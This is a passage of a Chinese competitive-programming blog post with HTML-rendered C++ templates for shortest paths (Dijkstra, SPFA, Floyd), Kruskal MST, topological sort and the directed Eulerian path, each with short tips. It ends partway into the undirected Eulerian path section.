class="title">Graph</span>&#123;</span></span><br><span class="line"><span class="type">int</span> nxt,to,val;</span><br><span class="line">&#125;edge[N&lt;&lt;<span class="number">1</span>];</span><br><span class="line"><span class="type">int</span> head[N],cnt;</span><br><span class="line"><span class="type">void</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span> u,<span class="type">int</span> v,<span class="type">int</span> w)</span>&#123;</span><br><span class="line">cnt++;</span><br><span class="line">edge[cnt].to = v;</span><br><span class="line">edge[cnt].nxt = head[u];</span><br><span class="line">edge[cnt].val = w;</span><br><span class="line">head[u] = cnt;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">did</span>&#123;</span></span><br><span class="line"><span class="type">int</span> u,d;</span><br><span class="line"><span class="type">bool</span> operator &lt; (<span class="type">const</span> did&amp;t)<span class="type">const</span>&#123;</span><br><span class="line"><span class="keyword">return</span> t.d&lt;d;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="built_in">priority_queue</span>&lt;did&gt;q;</span><br><span class="line"><span class="type">int</span> dis[N],vis[N];</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> inf = INT_MAX;</span><br><span class="line"><span class="type">void</span> <span class="title function_">dijkstra</span><span class="params">(<span class="type">int</span> s)</span>&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=n;i++)dis[i] = inf;</span><br><span class="line">vis[s] = <span class="number">1</span>,dis[s] = <span class="number">0</span>;</span><br><span class="line">q.push(&#123;s,<span class="number">0</span>&#125;);</span><br><span class="line"><span class="keyword">while</span>(!q.empty())&#123;</span><br><span class="line">did tmp = q.top();</span><br><span class="line">q.pop();</span><br><span class="line"><span class="type">int</span> u = tmp.u,d = tmp.d;</span><br><span class="line"><span class="keyword">if</span>(dis[u]!=d)<span class="keyword">continue</span>; <span class="comment">// import optimization!</span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=head[u];i;i=edge[i].nxt)&#123;</span><br><span class="line"><span class="type">int</span> v = edge[i].to;</span><br><span class="line"><span class="type">int</span> w = edge[i].val;</span><br><span class="line"><span class="keyword">if</span>(dis[u]+w&lt;dis[v])&#123;</span><br><span class="line">dis[v] = dis[u]+w;</span><br><span class="line">vis[v] = <span class="number">1</span>;</span><br><span class="line">q.push(&#123;v,dis[v]&#125;);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">signed</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">ios::sync_with_stdio(<span class="literal">false</span>);</span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;n&gt;&gt;m&gt;&gt;s;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=m;i++)&#123;</span><br><span class="line"><span class="type">int</span> u,v,w;</span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;u&gt;&gt;v&gt;&gt;w;</span><br><span class="line">add(u,v,w);</span><br><span class="line">&#125;</span><br><span class="line">dijkstra(s);</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;dis[i]&lt;&lt;<span class="string">&quot; &quot;</span>;<span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="SPFA"><a href="#SPFA" class="headerlink" title="SPFA"></a>SPFA</h3><p>万一有负权呐~<br>同样有些细节要注意 记住spfa本质是bfs 所以要vis判重<br>最关键的是 <code>vis[u]=0</code> 因为要更新 所以要先置为0</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line">using namespace <span class="built_in">std</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> int long long</span></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">2e5</span>+<span class="number">5</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> inf = LONG_LONG_MAX;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Graph</span>&#123;</span></span><br><span class="line"><span class="type">int</span> nxt,to,val;</span><br><span class="line">&#125;edge[N&lt;&lt;<span class="number">1</span>];</span><br><span class="line"><span class="type">int</span> n,m,s;</span><br><span class="line"><span class="type">int</span> head[N],cnt;</span><br><span class="line"><span class="type">void</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span> u,<span class="type">int</span> v,<span class="type">int</span> w)</span>&#123;</span><br><span class="line">cnt++;</span><br><span class="line">edge[cnt].to = v;</span><br><span class="line">edge[cnt].nxt = head[u];</span><br><span class="line">edge[cnt].val = w;</span><br><span class="line">head[u] = cnt;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> vis[N],dis[N];</span><br><span class="line"><span class="built_in">queue</span>&lt;<span class="type">int</span>&gt;q;</span><br><span class="line"><span class="type">void</span> <span class="title function_">spfa</span><span class="params">(<span class="type">int</span> s)</span>&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=n;i++)dis[i] = inf;</span><br><span class="line">dis[s] = <span class="number">0</span>,vis[s] = <span class="number">1</span>;</span><br><span class="line">q.push(s);</span><br><span class="line"><span class="keyword">while</span>(!q.empty())&#123;</span><br><span class="line"><span class="type">int</span> u = q.front();</span><br><span class="line">q.pop();</span><br><span class="line">vis[u] = <span class="number">0</span>; <span class="comment">// !!!</span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=head[u];i;i=edge[i].nxt)&#123;</span><br><span class="line"><span class="type">int</span> v = edge[i].to;</span><br><span class="line"><span class="type">int</span> w = edge[i].val;</span><br><span class="line"><span class="keyword">if</span>(dis[u]+w&lt;dis[v])&#123;</span><br><span class="line">dis[v] = dis[u]+w;</span><br><span class="line"><span class="keyword">if</span>(!vis[v])&#123;</span><br><span class="line">vis[v] = <span class="number">1</span>;</span><br><span class="line">q.push(v);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">signed</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">ios::sync_with_stdio(<span class="literal">false</span>);</span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;n&gt;&gt;m&gt;&gt;s;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=m;i++)&#123;</span><br><span class="line"><span class="type">int</span> u,v,w;</span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;u&gt;&gt;v&gt;&gt;w;</span><br><span class="line">add(u,v,w);</span><br><span class="line">&#125;</span><br><span class="line">spfa(s);</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;dis[i]&lt;&lt;<span class="string">&quot; &quot;</span>;<span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Floyd"><a href="#Floyd" class="headerlink" title="Floyd"></a>Floyd</h3><p>以医院设置为例<br>注意点:</p><ol><li>初始化赋inf</li><li><code>g[i][i] = 0</code></li><li>先枚举k<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line">using namespace <span class="built_in">std</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> int long long</span></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">1e2</span>+<span class="number">5</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> inf = LONG_LONG_MAX;</span><br><span class="line"><span class="type">int</span> a[N],g[N][N],n;</span><br><span class="line"><span class="type">signed</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">ios::sync_with_stdio(<span class="literal">false</span>);</span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;n;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">1</span>;j&lt;=n;j++)</span><br><span class="line">g[i][j] = <span class="number">100000</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">g[i][i] = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> l,r;</span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;a[i]&gt;&gt;l&gt;&gt;r;</span><br><span class="line"><span class="keyword">if</span>(l&gt;<span class="number">0</span>)g[i][l] = g[l][i] = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">if</span>(r&gt;<span class="number">0</span>)g[i][r] = g[r][i] = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> k=<span class="number">1</span>;k&lt;=n;k++)</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line"><span class="keyword">if</span>(i!=k)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">1</span>;j&lt;=n;j++)</span><br><span class="line"><span class="keyword">if</span>(j!=k&amp;&amp;j!=i)</span><br><span class="line">g[i][j] = min(g[i][j],g[i][k]+g[k][j]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> minn = inf;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line"><span class="type">int</span> cost = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">1</span>;j&lt;=n;j++)</span><br><span class="line">cost += g[i][j]*a[j];</span><br><span class="line">minn = min(minn,cost);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;minn&lt;&lt;<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h2 id="MST"><a href="#MST" class="headerlink" title="MST"></a>MST</h2><p>模板:<br>几个注意点:</p><ol><li>并查集的<code>fa[]</code>初始化</li><li>不是用前向星建边 本质是记录的边的两个端点</li><li>结束条件: $num &#x3D;&#x3D; n-{连通块个数}$<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line">using namespace <span class="built_in">std</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> int long long</span></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">5e3</span>+<span class="number">5</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> M = <span class="number">2e5</span>+<span class="number">5</span>;</span><br><span class="line"><span class="type">int</span> n,m;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Graph</span>&#123;</span></span><br><span class="line"><span class="type">int</span> nxt,to,val;</span><br><span class="line">&#125;edge[M&lt;&lt;<span class="number">1</span>];</span><br><span class="line"><span class="type">bool</span> <span class="title function_">cmp</span><span class="params">(Graph x,Graph y)</span>&#123;</span><br><span class="line"><span class="keyword">return</span> x.val&lt;y.val;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> fa[N];</span><br><span class="line"><span class="type">int</span> <span class="title function_">getfa</span><span class="params">(<span class="type">int</span> x)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(fa[x]==x)<span class="keyword">return</span> x;</span><br><span class="line"><span class="keyword">return</span> fa[x] = getfa(fa[x]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">uni</span><span class="params">(<span class="type">int</span> x,<span class="type">int</span> y)</span>&#123;</span><br><span class="line"><span class="type">int</span> fx = getfa(x),fy = getfa(y);</span><br><span class="line">fa[fx] = fy;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">kruskal</span><span class="params">()</span>&#123;</span><br><span class="line">sort(edge+<span class="number">1</span>,edge+m+<span class="number">1</span>,cmp);</span><br><span class="line"><span class="type">int</span> num = <span class="number">0</span>,sum_mst = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=m;i++)&#123;</span><br><span class="line"><span class="type">int</span> u = edge[i].nxt,v = edge[i].to,w = edge[i].val;</span><br><span class="line"><span class="keyword">if</span>(getfa(u)==getfa(v))<span class="keyword">continue</span>;</span><br><span class="line">num++;</span><br><span class="line">sum_mst += w;</span><br><span class="line">uni(u,v);</span><br><span class="line"><span class="keyword">if</span>(num==n<span class="number">-1</span>)<span class="keyword">return</span> sum_mst;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">signed</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">ios::sync_with_stdio(<span class="literal">false</span>);</span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;n&gt;&gt;m;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=n;i++)fa[i] = i;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=m;i++)&#123;</span><br><span class="line"><span class="type">int</span> u,v,w;</span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;u&gt;&gt;v&gt;&gt;w;</span><br><span class="line">edge[i].nxt = u;</span><br><span class="line">edge[i].to = v;</span><br><span class="line">edge[i].val = w;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> ans = kruskal();</span><br><span class="line"><span class="keyword">if</span>(!ans)<span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;orz\n&quot;</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="built_in">cout</span>&lt;&lt;ans&lt;&lt;<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h2 id="拓扑排序"><a href="#拓扑排序" class="headerlink" title="拓扑排序"></a>拓扑排序</h2><p>以P1960为例<br>topsort关键流程:</p><ol><li>根据题目建图连边</li><li>统计入度</li><li>初始寻找一遍入度为0的dian</li><li>输出queue.front() 然后把与之相连的点度-1 继续找度为0的点</li><li>多解情况判断: 某次找度为0的点时有&gt;1个<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line">using namespace <span class="built_in">std</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">1e5</span>+<span class="number">5</span>;</span><br><span class="line"><span class="type">int</span> n,m;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Graph</span>&#123;</span></span><br><span class="line"><span class="type">int</span> nxt,to,val;</span><br><span class="line">&#125;edge[N&lt;&lt;<span class="number">1</span>];</span><br><span class="line"><span class="type">int</span> head[N],cnt;</span><br><span class="line"><span class="type">void</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span> u,<span class="type">int</span> v)</span>&#123;</span><br><span class="line">cnt++;</span><br><span class="line">edge[cnt].to = v;</span><br><span class="line">edge[cnt].nxt = head[u];</span><br><span class="line">head[u] = cnt;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> in[N]; <span class="comment">// in-degree</span></span><br><span class="line"><span class="built_in">queue</span>&lt;<span class="type">int</span>&gt;ans;</span><br><span class="line"><span class="type">int</span> flag = <span class="number">0</span>; <span class="comment">// Multi-Ans</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">tpsort</span><span class="params">()</span>&#123;</span><br><span class="line"><span class="type">int</span> t = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line"><span class="keyword">if</span>(in[i]==<span class="number">0</span>)&#123;</span><br><span class="line">ans.push(i);</span><br><span class="line">t++;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(t&gt;<span class="number">1</span>)flag = <span class="number">1</span>;</span><br><span class="line">t = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span>(!ans.empty())&#123;</span><br><span class="line"><span class="type">int</span> u = ans.front();</span><br><span class="line">ans.pop();</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;u&lt;&lt;<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=head[u];i;i=edge[i].nxt)&#123;</span><br><span class="line"><span class="type">int</span> v = edge[i].to;</span><br><span class="line">in[v]--; <span class="comment">// for all v that directly connected to u</span></span><br><span class="line"><span class="keyword">if</span>(in[v]==<span class="number">0</span>)&#123;</span><br><span class="line">ans.push(v);</span><br><span class="line">t++;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(t&gt;<span class="number">1</span>)flag = <span class="number">1</span>;</span><br><span class="line">t = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;flag&lt;&lt;<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">signed</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">ios::sync_with_stdio(<span class="literal">false</span>);</span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;n&gt;&gt;m;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=m;i++)&#123;</span><br><span class="line"><span class="type">int</span> u,v;</span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;u&gt;&gt;v;</span><br><span class="line">add(u,v);</span><br><span class="line">in[v]++;</span><br><span class="line">&#125;</span><br><span class="line">tpsort();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h2 id="欧拉路径-回路"><a href="#欧拉路径-回路" class="headerlink" title="欧拉路径(回路)"></a>欧拉路径(回路)</h2><p><a href="https://www.cnblogs.com/NozoMizo/articles/17337290.html">https://www.cnblogs.com/NozoMizo/articles/17337290.html</a><br><a href="https://www.cnblogs.com/NozoMizo/articles/17347676.html">https://www.cnblogs.com/NozoMizo/articles/17347676.html</a><br>一笔画即为欧拉路径 起点&#x3D;&#x3D;终点: 欧拉回路<br>由于都有字典序要求 所以用<code>vector</code>实现</p><h3 id="有向图"><a href="#有向图" class="headerlink" title="有向图"></a>有向图</h3><p>要注意dfs中 要设定<code>cur[u]</code> 不然死循环了…</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line">using namespace <span class="built_in">std</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">2e5</span>+<span class="number">5</span>;</span><br><span class="line"><span class="type">int</span> n,m;</span><br><span class="line"><span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;G[N];</span><br><span class="line"><span class="type">int</span> in[N],out[N],cnt1,cnt2;</span><br><span class="line"><span class="built_in">stack</span>&lt;<span class="type">int</span>&gt;st;</span><br><span class="line"><span class="type">int</span> cur[N];</span><br><span class="line"><span class="type">void</span> <span class="title function_">dfs</span><span class="params">(<span class="type">int</span> u)</span>&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=cur[u];i&lt;G[u].size();i=cur[u])&#123;</span><br><span class="line">cur[u] = i+<span class="number">1</span>;</span><br><span class="line">dfs(G[u][i]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">st.push(u);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">signed</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">ios::sync_with_stdio(<span class="literal">false</span>);</span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;n&gt;&gt;m;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=m;i++)&#123;</span><br><span class="line"><span class="type">int</span> u,v;</span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;u&gt;&gt;v;</span><br><span class="line">G[u].push_back(v);</span><br><span class="line">in[v]++,out[u]++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">sort(G[i].begin(),G[i].end());</span><br><span class="line"><span class="type">int</span> is_loop = <span class="number">1</span>;</span><br><span class="line"><span class="type">int</span> start = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line"><span class="keyword">if</span>(in[i]!=out[i])<span class="comment">//not loop</span></span><br><span class="line">&#123;</span><br><span class="line">is_loop = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>(out[i]==in[i]+<span class="number">1</span>)&#123;</span><br><span class="line">start = i;</span><br><span class="line">cnt1++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(in[i]==out[i]+<span class="number">1</span>)&#123;</span><br><span class="line">cnt2++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;No\n&quot;</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(is_loop==<span class="number">0</span>&amp;!(cnt1==<span class="number">1</span>&amp;&amp;cnt2==<span class="number">1</span>))&#123;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;No\n&quot;</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">dfs(start);</span><br><span class="line"><span class="keyword">while</span>(!st.empty())&#123;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;st.top()&lt;&lt;<span class="string">&quot; &quot;</span>;</span><br><span class="line">st.pop();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="无向图"><a href="#无向图" class="headerlink" title="无向图"></a>无向图</h3><p>注意与有向图不同的判定条件<br><img src="https://img2024.cnblogs.com/blog/3092507/202403/3092507-20240306183051630-2025824084.png" alt="image"></p><p>这道题还有个注意点: 遍历的不是 <code>1~n</code> 是 <code>1~125</code> 因为我们图的节点选的是字母的<code>chr</code><br>这里<code>dfs</code>的本质就是模拟走一遍 走一条边删一条 然后入栈</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span 